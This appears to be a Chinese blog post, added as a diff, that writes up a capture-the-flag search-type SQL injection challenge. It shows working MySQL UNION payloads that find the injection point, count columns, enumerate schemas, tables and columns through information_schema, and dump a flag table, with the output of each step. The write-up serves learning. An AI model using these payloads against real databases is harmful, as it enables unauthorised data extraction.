@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>SQL搜索型注入02 | 执徐的小博客</title>
+<meta name="description" content="con argucia feroz su hilo de hielo,
+brotó un clavel bajo su fina punta
+en tu negro jubón de terciopelo.">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="https://abraxasfever.github.io//favicon.ico?v=1726716634081">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://abraxasfever.github.io//styles/main.css">
+
+
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+  </head>
+  <body>
+  
+    <nav class="navbar border fixed split-nav">
+  <div class="nav-brand">
+    <h3><a href="https://abraxasfever.github.io/">执徐的小博客</a></h3>
+  </div>
+  <div class="collapsible">
+    <input id="collapsible1" type="checkbox" name="collapsible1">
+    <button>
+      <label for="collapsible1">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+      </label>
+    </button>
+    <div class="collapsible-body">
+      <ul class="inline">
+        
+          <li>
+            
+              <a href="/" class="menu">
+                首页
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/archives" class="menu">
+                归档
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/tags" class="menu">
+                标签
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/post/about" class="menu">
+                关于
+              </a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div id="top" class="row site">
+      <div class="sm-12 md-8 col">
+        <div class="paper">
+          <article class="article">
+            <h1>SQL搜索型注入02</h1>
+            <p class="article-meta">
+              2020-03-20
+              
+                <a href="https://abraxasfever.github.io/tag/Uc3EOQkc2g/" class="badge success">
+                  SQL注入
+                </a>
+              
+            </p>
+            
+            <div class="post-content" v-pre>
+              <p>题目URL：<a href="http://www.whalwl.top:8015/login.php">http://www.whalwl.top:8015/login.php</a><br>
+<img src="https://abraxasfever.github.io//post-images/1584775516472.png" alt="" loading="lazy"></p>
+<p>A</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">电影名称</th>
+<th style="text-align:center">发行时间</th>
+<th style="text-align:center">主角</th>
+<th style="text-align:center">类型</th>
+<th style="text-align:center">电影资料库</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">G.I. Joe: Retaliation</td>
+<td style="text-align:center">2013</td>
+<td style="text-align:center">Cobra</td>
+<td style="text-align:center">Commander</td>
+<td style="text-align:center">action</td>
+</tr>
+<tr>
+<td style="text-align:center">Iron Man</td>
+<td style="text-align:center">2008</td>
+<td style="text-align:center">Tony Stark</td>
+<td style="text-align:center">action</td>
+<td style="text-align:center">Link</td>
+</tr>
+<tr>
+<td style="text-align:center">Man of Steel</td>
+<td style="text-align:center">2013</td>
+<td style="text-align:center">Clark Kent</td>
+<td style="text-align:center">action</td>
+<td style="text-align:center">Link</td>
+</tr>
+<tr>
+<td style="text-align:center">Terminator Salvation</td>
+<td style="text-align:center">2009</td>
+<td style="text-align:center">John Connor</td>
+<td style="text-align:center">sci-fi</td>
+<td style="text-align:center">Link</td>
+</tr>
+<tr>
+<td style="text-align:center">The Amazing Spider-Man</td>
+<td style="text-align:center">2012</td>
+<td style="text-align:center">Peter Parker</td>
+<td style="text-align:center">action</td>
+<td style="text-align:center">Link</td>
+</tr>
+<tr>
+<td style="text-align:center">The Cabin in the Woods</td>
+<td style="text-align:center">2011</td>
+<td style="text-align:center">Some zombies</td>
+<td style="text-align:center">horror</td>
+<td style="text-align:center">Link</td>
+</tr>
+<tr>
+<td style="text-align:center">The Dark Knight Rises</td>
+<td style="text-align:center">2012</td>
+<td style="text-align:center">Bruce Wayne</td>
+<td style="text-align:center">action</td>
+<td style="text-align:center">Link</td>
+</tr>
+<tr>
+<td style="text-align:center">The Fast and the Furious</td>
+<td style="text-align:center">2001</td>
+<td style="text-align:center">Brian O'Connor</td>
+<td style="text-align:center">action</td>
+<td style="text-align:center">Link</td>
+</tr>
+<tr>
+<td style="text-align:center">World War Z</td>
+<td style="text-align:center">2013</td>
+<td style="text-align:center">Gerry Lane</td>
+<td style="text-align:center">horror</td>
+<td style="text-align:center">Link</td>
+</tr>
+</tbody>
+</table>
+<p>A%'or 1=1 # 返回全部值<br>
+A%'and 1=2 # 返回为空<br>
+找到注入点</p>
+<p>A%'order by 7 #<br>
+A%'order by 8 # 报错 猜测7列</p>
+<p>1%'union select 1,2,3,4,5,6,7 #</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">电影名称</th>
+<th style="text-align:center">发行时间</th>
+<th style="text-align:center">主角</th>
+<th style="text-align:center">类型</th>
+<th style="text-align:center">电影资料库</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">2</td>
+<td style="text-align:center">3</td>
+<td style="text-align:center">5</td>
+<td style="text-align:center">4</td>
+<td style="text-align:center">Link</td>
+</tr>
+<tr>
+<td style="text-align:center">返回值在2，3，4，5</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+</tbody>
+</table>
+<p>1' union select 1,concat(version(),user()),concat(database()),4,5,6,7#</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">电影名称</th>
+<th style="text-align:center">发行时间</th>
+<th style="text-align:center">主角</th>
+<th style="text-align:center">类型</th>
+<th style="text-align:center">电影资料库</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">5.5.47-0ubuntu0.14.04.1root@localhost</td>
+<td style="text-align:center">whalwl</td>
+<td style="text-align:center">5</td>
+<td style="text-align:center">4</td>
+<td style="text-align:center">Link</td>
+</tr>
+</tbody>
+</table>
+<p>1' union select 1,group_concat(SCHEMA_NAME),3,4,5,6,7 from information_schema.SCHEMATA #</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">电影名称</th>
+<th style="text-align:center">发行时间</th>
+<th style="text-align:center">主角</th>
+<th style="text-align:center">类型</th>
+<th style="text-align:center">电影资料库</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">information_schema,mysql,performance_schema,whalwl</td>
+<td style="text-align:center">3</td>
+<td style="text-align:center">5</td>
+<td style="text-align:center">4</td>
+<td style="text-align:center">Link</td>
+</tr>
+</tbody>
+</table>
+<p>1' union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.TABLES WHERE table_schema = 'whalwl' #</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">电影名称</th>
+<th style="text-align:center">发行时间</th>
+<th style="text-align:center">主角</th>
+<th style="text-align:center">类型</th>
+<th style="text-align:center">电影资料库</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">blog,heroes,movies,this_flag,users,visitors</td>
+<td style="text-align:center">3</td>
+<td style="text-align:center">5</td>
+<td style="text-align:center">4</td>
+<td style="text-align:center">Link</td>
+</tr>
+</tbody>
+</table>
+<p>1' union select 1,group_concat(column_name),3,4,5,6,7 from information_schema.COLUMNS WHERE table_name = 'this_flag' #</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">电影名称</th>
+<th style="text-align:center">发行时间</th>
+<th style="text-align:center">主角</th>
+<th style="text-align:center">类型</th>
+<th style="text-align:center">电影资料库</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">id,num,flag</td>
+<td style="text-align:center">3</td>
+<td style="text-align:center">5</td>
+<td style="text-align:center">4</td>
+<td style="text-align:center">Link</td>
+</tr>
+</tbody>
+</table>
+<p>1'union select 1,id,num,4,flag,6,7 from this_flag #</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">电影名称</th>
+<th style="text-align:center">发行时间</th>
+<th style="text-align:center">主角</th>
+<th style="text-align:center">类型</th>
+<th style="text-align:center">电影资料库</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">1</td>
+<td style="text-align:center">9</td>
+<td style="text-align:center">1234567890</td>
+<td style="text-align:center">4</td>
+<td style="text-align:center">Link</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td style="text-align:center">10</td>
+<td style="text-align:center">flag{86b757e867b43d16050225ab516b2274}</td>
+<td style="text-align:center">4</td>
+<td style="text-align:center">Link</td>
+</tr>
+</tbody>
+</table>
+
+            </div>
+          </article>
+        </div>
+        <div class="paper" data-aos="fade-in">
+          
+        </div>
+        
+      </div>
+
+      <div class="sm-12 md-4 col sidebar">
+  <div class="paper info-container">
+    <img src="https://abraxasfever.github.io//images/avatar.png?v=1726716634081" class="no-responsive avatar">
+    <div class="text-muted">con argucia feroz su hilo de hielo,
+brotó un clavel bajo su fina punta
+en tu negro jubón de terciopelo.</div>
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      最新文章
+    </div>
+    <div class="row">
+      <ul>
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/nao-zhong-liu-tu-xiang-fen-ge-model/">脑肿瘤图像分割UNet3+_Deep_HDC</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/shen-du-xue-xi/">Comparative Study of Deep Learning Models for Brain Tumor MRI Segmentation: Application of U-Net 3+ and Its Variants</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/ji-yu-metasploit-de-log4j2-lou-dong-li-yong-mo-kuai/">基于Metasploit的Log4j2漏洞利用模块</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/wo-zai-xiao-yuan-zi-dong-da-qia/">我在校园自动打卡</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/web-tomcat/">漏洞利用-tomcat管理密码破解</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/web-irc/">漏洞利用-irc后门利用</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/web-vnc/">漏洞利用-vnc密码破解</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/web-postgresql/">漏洞利用-postgresql数据库密码破解</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/web-mysql/">漏洞利用-mysql弱口令破解</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://abraxasfever.github.io/post/web-proftpd/">漏洞利用-proftpd测试</a>
+            </li>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      标签列表
+    </div>
+    <div class="row">
+      
+        <a href="https://abraxasfever.github.io/tag/DeepLearning/" class="badge ">
+          深度学习
+        </a>
+      
+        <a href="https://abraxasfever.github.io/tag/CyberSecurity/" class="badge secondary">
+          网络安全
+        </a>
+      
+        <a href="https://abraxasfever.github.io/tag/6lgRqMl6z/" class="badge warning">
+          HACK学习
+        </a>
+      
+    </div>
+  </div>
+  <div class="paper">
+     | <a class="rss" href="https://abraxasfever.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+
+
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+</script>
+
+
+
+
+  </body>
+</html>
